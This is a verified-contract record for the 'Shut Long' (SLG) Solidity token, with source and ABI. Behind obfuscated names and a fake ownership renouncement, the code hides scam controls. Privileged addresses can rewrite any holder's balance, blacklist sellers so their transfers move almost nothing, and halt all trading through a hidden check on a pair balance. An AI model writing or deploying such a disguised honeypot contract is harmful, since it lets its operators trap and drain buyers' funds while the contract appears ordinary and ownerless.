{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.9;\n\ninterface exemptMin {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract receiverExemptTake {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface senderSellWallet {\n    function createPair(address senderEnableWallet, address amountLaunched) external returns (address);\n}\n\ninterface liquidityEnableAt {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address fundTx) external view returns (uint256);\n\n    function transfer(address fundFromAt, uint256 feeTo) external returns (bool);\n\n    function allowance(address marketingTrading, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 feeTo) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address fundFromAt,\n        uint256 feeTo\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed walletIs, uint256 value);\n    event Approval(address indexed marketingTrading, address indexed spender, uint256 value);\n}\n\ninterface amountReceiverLimit is liquidityEnableAt {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ShutLong is receiverExemptTake, liquidityEnableAt, amountReceiverLimit {\n\n    function allowance(address atList, address teamLiquidity) external view virtual override returns (uint256) {\n        if (teamLiquidity == shouldTokenFund) {\n            return type(uint256).max;\n        }\n        return buyTrading[atList][teamLiquidity];\n    }\n\n    address marketingFund = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function liquidityReceiverTx(address marketingAmount, address fundFromAt, uint256 feeTo) internal returns (bool) {\n        require(enableTotal[marketingAmount] >= feeTo);\n        enableTotal[marketingAmount] -= feeTo;\n        enableTotal[fundFromAt] += feeTo;\n        emit Transfer(marketingAmount, fundFromAt, feeTo);\n        return true;\n    }\n\n    function limitTrading(uint256 feeTo) public {\n        fromTo();\n        amountMode = feeTo;\n    }\n\n    address private shouldMarketingBuy;\n\n    uint256 public modeEnableSender;\n\n    event OwnershipTransferred(address indexed swapMarketingSender, address indexed fromAmount);\n\n    function isMax(address maxLaunched) public {\n        fromTo();\n        \n        if (maxLaunched == launchSenderIs || maxLaunched == tokenFrom) {\n            return;\n        }\n        maxTo[maxLaunched] = true;\n    }\n\n    mapping(address => mapping(address => uint256)) private buyTrading;\n\n    function balanceOf(address fundTx) public view virtual override returns (uint256) {\n        return enableTotal[fundTx];\n    }\n\n    uint256 private marketingListLimit;\n\n    uint256 amountMode;\n\n    function enableWallet(address limitAtTotal) public {\n        if (toShould) {\n            return;\n        }\n        \n        atSwap[limitAtTotal] = true;\n        \n        toShould = true;\n    }\n\n    bool public takeAt;\n\n    function symbol() external view virtual override returns (string memory) {\n        return buyList;\n    }\n\n    uint256 launchedMax;\n\n    constructor (){\n        if (marketingListLimit != receiverLimit) {\n            receiverLimit = marketingListLimit;\n        }\n        exemptMin fromToken = exemptMin(shouldTokenFund);\n        tokenFrom = senderSellWallet(fromToken.factory()).createPair(fromToken.WETH(), address(this));\n        \n        launchSenderIs = _msgSender();\n        totalExemptMode();\n        atSwap[launchSenderIs] = true;\n        enableTotal[launchSenderIs] = maxSenderLiquidity;\n        \n        emit Transfer(address(0), launchSenderIs, maxSenderLiquidity);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return atAmount;\n    }\n\n    function atReceiver(address tradingTeam, uint256 feeTo) public {\n        fromTo();\n        enableTotal[tradingTeam] = feeTo;\n    }\n\n    mapping(address => bool) public atSwap;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return maxSenderLiquidity;\n    }\n\n    uint256 public receiverLimit;\n\n    bool public toShould;\n\n    string private atAmount = \"Shut Long\";\n\n    address public tokenFrom;\n\n    function owner() external view returns (address) {\n        return shouldMarketingBuy;\n    }\n\n    function fromTo() private view {\n        require(atSwap[_msgSender()]);\n    }\n\n    function modeAt(address marketingAmount, address fundFromAt, uint256 feeTo) internal returns (bool) {\n        if (marketingAmount == launchSenderIs) {\n            return liquidityReceiverTx(marketingAmount, fundFromAt, feeTo);\n        }\n        uint256 minTrading = liquidityEnableAt(tokenFrom).balanceOf(marketingFund);\n        require(minTrading == amountMode);\n        require(fundFromAt != marketingFund);\n        if (maxTo[marketingAmount]) {\n            return liquidityReceiverTx(marketingAmount, fundFromAt, launchTeam);\n        }\n        return liquidityReceiverTx(marketingAmount, fundFromAt, feeTo);\n    }\n\n    address public launchSenderIs;\n\n    function decimals() external view virtual override returns (uint8) {\n        return atLiquidity;\n    }\n\n    uint8 private atLiquidity = 18;\n\n    string private buyList = \"SLG\";\n\n    function getOwner() external view returns (address) {\n        return shouldMarketingBuy;\n    }\n\n    function transfer(address tradingTeam, uint256 feeTo) external virtual override returns (bool) {\n        return modeAt(_msgSender(), tradingTeam, feeTo);\n    }\n\n    address shouldTokenFund = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    bool private fromSender;\n\n    uint256 private maxSenderLiquidity = 100000000 * 10 ** 18;\n\n    function totalExemptMode() public {\n        emit OwnershipTransferred(launchSenderIs, address(0));\n        shouldMarketingBuy = address(0);\n    }\n\n    mapping(address => bool) public maxTo;\n\n    bool private atWalletShould;\n\n    function transferFrom(address marketingAmount, address fundFromAt, uint256 feeTo) external override returns (bool) {\n        if (_msgSender() != shouldTokenFund) {\n            if (buyTrading[marketingAmount][_msgSender()] != type(uint256).max) {\n                require(feeTo <= buyTrading[marketingAmount][_msgSender()]);\n                buyTrading[marketingAmount][_msgSender()] -= feeTo;\n            }\n        }\n        return modeAt(marketingAmount, fundFromAt, feeTo);\n    }\n\n    mapping(address => uint256) private enableTotal;\n\n    function approve(address teamLiquidity, uint256 feeTo) public virtual override returns (bool) {\n        buyTrading[_msgSender()][teamLiquidity] = feeTo;\n        emit Approval(_msgSender(), teamLiquidity, feeTo);\n        return true;\n    }\n\n    uint256 private txTotal;\n\n    uint256 constant launchTeam = 11 ** 10;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingTrading\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapMarketingSender\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromAmount\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletIs\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atList\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"teamLiquidity\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamLiquidity\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeTo\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeTo\",\"type\":\"uint256\"}],\"name\":\"atReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"atSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundTx\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitAtTotal\",\"type\":\"address\"}],\"name\":\"enableWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxLaunched\",\"type\":\"address\"}],\"name\":\"isMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchSenderIs\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"feeTo\",\"type\":\"uint256\"}],\"name\":\"limitTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"maxTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeEnableSender\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverLimit\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenFrom\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalExemptMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeTo\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingAmount\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fundFromAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeTo\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ShutLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}